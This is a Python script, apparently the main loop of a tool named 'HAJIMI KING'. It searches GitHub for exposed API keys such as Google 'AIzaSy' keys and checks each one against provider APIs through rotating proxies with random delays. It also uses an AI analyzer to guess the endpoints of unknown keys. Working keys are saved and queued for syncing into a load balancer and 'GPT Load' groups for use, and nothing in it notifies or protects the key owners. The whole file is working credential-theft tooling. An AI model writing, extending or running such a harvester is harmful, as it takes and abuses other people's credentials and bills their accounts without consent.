import os
import random
import re
import sys
import time
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any

import google.generativeai as genai
from google.api_core import exceptions as google_exceptions

from common.Logger import logger

sys.path.append('../')
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils

# 创建GitHub工具实例和文件管理器
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)

# 统计信息
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}


def normalize_query(query: str) -> str:
    query = " ".join(query.split())

    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings = []
    language_parts = []
    filename_parts = []
    path_parts = []
    other_parts = []

    for part in parts:
        if part.startswith('"') and part.endswith('"'):
            quoted_strings.append(part)
        elif part.startswith('language:'):
            language_parts.append(part)
        elif part.startswith('filename:'):
            filename_parts.append(part)
        elif part.startswith('path:'):
            path_parts.append(part)
        elif part.strip():
            other_parts.append(part)

    normalized_parts = []
    normalized_parts.extend(sorted(quoted_strings))
    normalized_parts.extend(sorted(other_parts))
    normalized_parts.extend(sorted(language_parts))
    normalized_parts.extend(sorted(filename_parts))
    normalized_parts.extend(sorted(path_parts))

    return " ".join(normalized_parts)


def extract_keys_from_content(content: str) -> List[str]:
    pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
    return re.findall(pattern, content)


def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    """
    检查是否应该跳过处理此item
    
    Returns:
        tuple: (should_skip, reason)
    """
    # 检查增量扫描时间
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except Exception as e:
            pass

    # 检查SHA是否已扫描
    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    # 检查仓库年龄
    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    # 检查文档和示例文件
    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item(item: Dict[str, Any]) -> tuple:
    """
    处理单个GitHub搜索结果item
    
    Returns:
        tuple: (valid_keys_count, rate_limited_keys_count)
    """
    delay = random.uniform(1, 5)
    file_url = item["html_url"]

    # 简化日志输出，只显示关键信息
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"⚠️ Failed to fetch content for file: {file_url}")
        return 0, 0

    # 使用基于配置的多供应商密钥提取
    from app.providers.config_key_extractor import config_key_extractor
    all_keys = config_key_extractor.extract_all_keys(content)

    if not all_keys:
        return 0, 0

    total_valid_keys = 0
    total_rate_limited_keys = 0
    all_checked_keys = []  # 收集所有已经检查过的密钥

    # 处理每个供应商的密钥
    for provider_name, keys in all_keys.items():
        if not keys:
            continue

        logger.info(f"🔑 Found {len(keys)} {provider_name} suspected key(s), validating...")

        # 过滤占位符密钥
        filtered_keys = []
        for key in keys:
            context_index = content.find(key)
            if context_index != -1:
                snippet = content[context_index:context_index + 45]
                if "..." in snippet or "YOUR_" in snippet.upper():
                    continue
            filtered_keys.append(key)
        
        # 去重处理
        keys = list(set(filtered_keys))

        if not keys:
            continue

        valid_keys = []
        rate_limited_keys = []

        # 获取供应商实例并验证密钥
        try:
            from app.providers.config_based_factory import ConfigBasedAIProviderFactory
            provider = ConfigBasedAIProviderFactory.get_provider_by_name(provider_name)
            
            if not provider:
                logger.warning(f"❌ Provider {provider_name} not found in configuration")
                continue
            
            for key in keys:
                validation_result = provider.validate_key(key)
                if validation_result and "ok" in validation_result:
                    valid_keys.append(key)
                    logger.info(f"✅ VALID {provider_name.upper()}: {key}")
                elif "rate_limited" in validation_result:
                    rate_limited_keys.append(key)
                    logger.warning(f"⚠️ RATE LIMITED {provider_name.upper()}: {key}, result: {validation_result}")
                else:
                    logger.info(f"❌ INVALID {provider_name.upper()}: {key}, result: {validation_result}")
                    # 预设供应商验证失败，尝试AI分析提取URL信息
                    logger.info(f"🤖 密钥 {key[:10]}... 预设供应商验证无效，尝试AI提取URL信息...")
                    
                    # 检查是否应该跳过AI分析（Gemini或OpenRouter格式的密钥）
                    if _should_skip_ai_analysis(key):
                        logger.info(f"⏭️ 跳过AI分析：密钥 {key[:10]}... 符合已知格式（Gemini或OpenRouter）")
                    else:
                        _analyze_and_validate_key_with_ai(content, repo_name, file_path, file_url, key)
                
                # 记录所有检查过的密钥
                all_checked_keys.append(key)
                    
        except Exception as e:
            logger.error(f"❌ Error validating {provider_name} keys: {e}")
            continue

        # 保存结果
        if valid_keys:
            file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys, provider_name)
            logger.info(f"💾 Saved {len(valid_keys)} valid {provider_name} key(s)")
            # 添加到同步队列（不阻塞主流程）
            try:
                # 获取供应商的GPT Load Group名称
                group_name = config_key_extractor.get_gpt_load_group_name(provider_name)
                sync_utils.add_keys_to_queue(valid_keys, provider_name, group_name)
                logger.info(f"📥 Added {len(valid_keys)} {provider_name} key(s) to sync queues (Group: {group_name})")
            except Exception as e:
                logger.error(f"📥 Error adding {provider_name} keys to sync queues: {e}")

        if rate_limited_keys:
            file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys, provider_name)
            logger.info(f"💾 Saved {len(rate_limited_keys)} rate limited {provider_name} key(s)")

        total_valid_keys += len(valid_keys)
        total_rate_limited_keys += len(rate_limited_keys)

    return total_valid_keys, total_rate_limited_keys


def validate_gemini_key(api_key: str) -> Union[bool, str]:
    try:
        time.sleep(random.uniform(1, 5))

        # 获取随机代理配置
        proxy_config = Config.get_random_proxy()
        
        client_options = {
            "api_endpoint": "generativelanguage.googleapis.com"
        }
        
        # 如果有代理配置，添加到client_options中
        if proxy_config:
            os.environ['grpc_proxy'] = proxy_config.get('http')

        genai.configure(
            api_key=api_key,
            client_options=client_options,
        )

        model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
        response = model.generate_content("hi")
        return "ok"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
        return "not_authorized_key"
    except google_exceptions.TooManyRequests as e:
        return "rate_limited"
    except Exception as e:
        if "429" in str(e) or "rate limit" in str(e).lower() or "quota" in str(e).lower():
            return "rate_limited:429"
        elif "403" in str(e) or "SERVICE_DISABLED" in str(e) or "API has not been used" in str(e):
            return "disabled"
        else:
            return f"error:{e.__class__.__name__}"


def print_skip_stats():
    """打印跳过统计信息"""
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(f"📊 Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")


def reset_skip_stats():
    """重置跳过统计"""
    global skip_stats
    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}


def main():
    start_time = datetime.now()

    # 打印系统启动信息
    logger.info("=" * 60)
    logger.info("🚀 HAJIMI KING STARTING")
    logger.info("=" * 60)
    logger.info(f"⏰ Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    # 1. 检查配置
    if not Config.check():
        logger.info("❌ Config check failed. Exiting...")
        sys.exit(1)
    # 2. 检查文件管理器
    if not file_manager.check():
        logger.error("❌ FileManager check failed. Exiting...")
        sys.exit(1)

    # 2.5. 显示SyncUtils状态和队列信息
    if sync_utils.balancer_enabled:
        logger.info("🔗 SyncUtils ready for async key syncing")
        
    # 显示队列状态
    balancer_queue_count = len(checkpoint.wait_send_balancer)
    gpt_load_queue_count = len(checkpoint.wait_send_gpt_load)
    logger.info(f"📊 Queue status - Balancer: {balancer_queue_count}, GPT Load: {gpt_load_queue_count}")

    # 3. 显示系统信息
    search_queries = file_manager.get_search_queries()
    logger.info("📋 SYSTEM INFORMATION:")
    logger.info(f"🔑 GitHub tokens: {len(Config.GITHUB_TOKENS)} configured")
    logger.info(f"🔍 Search queries: {len(search_queries)} loaded")
    logger.info(f"📅 Date filter: {Config.DATE_RANGE_DAYS} days")
    if Config.PROXY_LIST:
        logger.info(f"🌐 Proxy: {len(Config.PROXY_LIST)} proxies configured")

    if checkpoint.last_scan_time:
        logger.info(f"💾 Checkpoint found - Incremental scan mode")
        logger.info(f"   Last scan: {checkpoint.last_scan_time}")
        logger.info(f"   Scanned files: {len(checkpoint.scanned_shas)}")
        # 不再显示已处理查询的数量，因为查询不会被跳过
        # logger.info(f"   Processed queries: {len(checkpoint.processed_queries)}")
    else:
        logger.info(f"💾 No checkpoint - Full scan mode")


    logger.info("✅ System ready - Starting king")
    logger.info("=" * 60)

    total_keys_found = 0
    total_rate_limited_keys = 0
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")

            query_count = 0
            loop_processed_files = 0
            reset_skip_stats()

            for i, q in enumerate(search_queries, 1):
                normalized_q = normalize_query(q)
                # 不再跳过已处理的查询，以支持持续运行和挖掘新的key
                # if normalized_q in checkpoint.processed_queries:
                #     logger.info(f"🔍 Skipping already processed query: [{q}],index:#{i}")
                #     continue

                res = github_utils.search_for_keys(q)

                if res and "items" in res:
                    items = res["items"]
                    if items:
                        query_valid_keys = 0
                        query_rate_limited_keys = 0
                        query_processed = 0

                        for item_index, item in enumerate(items, 1):

                            # 每20个item保存checkpoint并显示进度
                            if item_index % 20 == 0:
                                logger.info(
                                    f"📈 Progress: {item_index}/{len(items)} | query: {q} | current valid: {query_valid_keys} | current rate limited: {query_rate_limited_keys} | total valid: {total_keys_found} | total rate limited: {total_rate_limited_keys}")
                                file_manager.save_checkpoint(checkpoint)
                                file_manager.update_dynamic_filenames()

                            # 检查是否应该跳过此item
                            should_skip, skip_reason = should_skip_item(item, checkpoint)
                            if should_skip:
                                logger.info(f"🚫 Skipping item,name: {item.get('path','').lower()},index:{item_index} - reason: {skip_reason}")
                                continue

                            # 处理单个item
                            valid_count, rate_limited_count = process_item(item)

                            query_valid_keys += valid_count
                            query_rate_limited_keys += rate_limited_count
                            query_processed += 1

                            # 记录已扫描的SHA
                            checkpoint.add_scanned_sha(item.get("sha"))

                            loop_processed_files += 1



                        total_keys_found += query_valid_keys
                        total_rate_limited_keys += query_rate_limited_keys

                        if query_processed > 0:
                            logger.info(f"✅ Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}, Rate limited: +{query_rate_limited_keys}")
                        else:
                            logger.info(f"⏭️ Query {i}/{len(search_queries)} complete - All items skipped")

                        print_skip_stats()
                    else:
                        logger.info(f"📭 Query {i}/{len(search_queries)} - No items found")
                else:
                    logger.warning(f"❌ Query {i}/{len(search_queries)} failed")

                # 不再将查询添加到已处理列表中
                # checkpoint.add_processed_query(normalized_q)
                query_count += 1

                checkpoint.update_scan_time()
                file_manager.save_checkpoint(checkpoint)
                file_manager.update_dynamic_filenames()

                if query_count % 5 == 0:
                    logger.info(f"⏸️ Processed {query_count} queries, taking a break...")
                    time.sleep(1)

            logger.info(f"🏁 Loop #{loop_count} complete - Processed {loop_processed_files} files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}")

            logger.info(f"💤 Sleeping for 10 seconds...")
            time.sleep(10)

        except KeyboardInterrupt:
            logger.info("⛔ Interrupted by user")
            checkpoint.update_scan_time()
            file_manager.save_checkpoint(checkpoint)
            logger.info(f"📊 Final stats - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}")
            logger.info("🔚 Shutting down sync utils...")
            sync_utils.shutdown()
            break
        except Exception as e:
            logger.error(f"💥 Unexpected error: {e}")
            traceback.print_exc()
            logger.info("🔄 Continuing...")
            continue

def _analyze_and_validate_key_with_ai(content: str, repo_name: str, file_path: str, file_url: str, key: str) -> None:
    """
    使用AI分析文件内容，提取特定密钥的URL和模型信息，并进行验证
    
    Args:
        content: 文件内容
        repo_name: 仓库名称
        file_path: 文件路径
        file_url: 文件URL
        key: 需要分析的API密钥
    """
    try:
        # 导入AI分析器
        from utils.ai_analyzer import AIAnalyzer
        ai_analyzer = AIAnalyzer()
        
        if not ai_analyzer.enabled:
            logger.info("🤖 AI分析功能未启用，跳过")
            return
            
        # 使用AI提取API信息
        api_info = ai_analyzer.extract_api_info(content, file_path, key)
        
        if not api_info or not api_info.get('base_url'):
            logger.info(f"🤖 AI无法提取密钥 {key[:10]}... 的URL信息")
            return
            
        base_url = api_info['base_url']
        model = api_info.get('model', 'gpt-3.5-turbo')
        service_type = api_info.get('service_type', 'unknown')
        
        logger.info(f"🤖 AI提取到信息: URL={base_url}, Model={model}, Service={service_type}")
        
        # 使用OpenAI格式验证密钥
        is_valid, validation_result = ai_analyzer.validate_key_with_openai_format(key, base_url, model)
        
        if is_valid:
            logger.info(f"✅ AI验证有效: {key[:10]}... (URL: {base_url})")
            # 保存AI分析结果
            from utils.file_manager import file_manager
            file_manager.save_ai_valid_key(repo_name, file_path, file_url, key, base_url, model, service_type)
        else:
            logger.info(f"❌ AI验证无效: {key[:10]}... - {validation_result}")
            
    except Exception as e:
        logger.error(f"❌ AI分析处理失败: {e}")
        import traceback
        traceback.print_exc()


def _should_skip_ai_analysis(key: str) -> bool:
    """
    检查是否应该跳过AI分析
    
    Args:
        key: API密钥
        
    Returns:
        bool: 如果密钥符合配置中的格式，返回True
    """
    # 使用基于配置的密钥提取器检查是否应该跳过AI分析
    from app.providers.key_extractor import KeyExtractor
    return KeyExtractor.should_skip_ai_analysis_by_config(key)


if __name__ == "__main__":
    main()
